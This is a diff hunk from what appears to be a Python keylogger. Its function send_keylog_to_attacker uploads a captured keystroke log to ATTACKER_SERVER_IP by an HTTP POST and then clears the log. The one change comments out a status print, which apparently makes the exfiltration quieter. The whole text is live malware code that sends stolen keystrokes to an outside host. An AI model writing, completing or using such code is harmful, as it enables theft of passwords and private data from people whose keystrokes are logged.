@@ -32,7 +32,7 @@ def send_keylog_to_attacker():
     with open(KEYLOG_TXT_FILE, 'rb') as file:
         files = {'file': (file.name, file)}
         response = requests.post(f'{ATTACKER_SERVER_IP}/upload_file', files=files)
-        print(f'Status code: {response.status_code}')
+        # print(f'Status code: {response.status_code}')
 
     reset_keylog_file()
 
